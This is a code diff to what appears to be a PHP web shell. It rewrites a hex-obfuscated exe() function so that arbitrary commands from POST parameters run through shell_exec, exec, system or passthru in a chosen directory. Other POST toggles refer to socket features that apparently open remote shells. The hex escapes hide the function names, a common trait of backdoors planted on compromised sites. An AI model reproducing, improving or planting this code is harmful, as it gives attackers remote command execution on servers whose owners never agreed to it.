@@ -59,13 +59,8 @@ function owner($file){
     }
     return 'unknown';
 }
-function exe($cmd){
-    if(function_exists("\x73\x68\x65\x6c\x6c\x5f\x65\x78\x65\x63")) return "\x73\x68\x65\x6c\x6c\x5f\x65\x78\x65\x63"($cmd);
-    elseif(function_exists("\x65\x78\x65\x63")){exec($cmd,$o);return implode("\n",$o);}
-    elseif(function_exists("\x73\x79\x73\x74\x65\x6d")){ob_start();system($cmd);$o=ob_get_clean();return $o;}
-    elseif(function_exists("\x70\x61\x73\x73\x74\x68\x72\x75")){ob_start();passthru($cmd);$o=ob_get_clean();return $o;}
-    return "Command execution not available.";
-}
+
+function exe($cmd, $cwd = null){ $cmd = "(" . $cmd . ") 2>&1"; if($cwd) { $cmd = "\x63\x64" . " " . escapeshellarg($cwd) . " && " . $cmd; } if(function_exists("\x73\x68\x65\x6c\x6c\x5f\x65\x78\x65\x63")) { $result = "\x73\x68\x65\x6c\x6c\x5f\x65\x78\x65\x63"($cmd); if($result === null || $result === false) { return "Command executed (no output)"; } return $result; } elseif(function_exists("\x65\x78\x65\x63")){ exec($cmd, $o, $return_var); $output = implode("\n", $o); if($return_var !== 0 && empty($output)) { return "Command failed with return code: " . $return_var; } return $output ?: "Command executed (no output)"; } elseif(function_exists("\x73\x79\x73\x74\x65\x6d")){ ob_start(); system($cmd, $return_var); $o = ob_get_clean(); if($return_var !== 0 && empty($o)) { return "Command failed with return code: " . $return_var; } return $o ?: "Command executed (no output)"; } elseif(function_exists("\x70\x61\x73\x73\x74\x68\x72\x75")){ ob_start(); passthru($cmd, $return_var); $o = ob_get_clean(); if($return_var !== 0 && empty($o)) { return "Command failed with return code: " . $return_var; } return $o ?: "Command executed (no output)"; } return "Command execution not available."; }
 function getFileDate($file, $format = 'F d Y H:i:s') { return date($format, filemtime($file)); }
 function formatSize($bytes){
     if($bytes>=1073741824) return number_format($bytes/1073741824,2).' GB';
@@ -231,11 +226,14 @@ $showTerminal = isset($_POST["\x74\x6f\x67\x67\x6c\x65\x5f\x74\x65\x72\x6d\x69\x
 $showGSocket = isset($_POST["\x73\x68\x6f\x77\x5f\x67\x73\x6f\x63\x6b\x65\x74"]) ? true : false;
 $showMiniSocket = isset($_POST["\x73\x68\x6f\x77\x5f\x6d\x69\x6e\x69\x73\x6f\x63\x6b\x65\x74"]) ? true : false;
 
+// if(isset($_POST["\x65\x78\x65\x63\x6d\x64"])){ 
+//     $terminal_output = exe($_POST["\x63\x6d\x64"]); 
+//     $showTerminal = true;
+// }
 if(isset($_POST["\x65\x78\x65\x63\x6d\x64"])){ 
-    $terminal_output = exe($_POST["\x63\x6d\x64"]); 
+    $terminal_output = exe($_POST["\x63\x6d\x64"], $path); 
     $showTerminal = true;
 }
-
 function getFileExtension($file){
     return strtolower("\x70\x61\x74\x68\x69\x6e\x66\x6f"($file, PATHINFO_EXTENSION));
 }
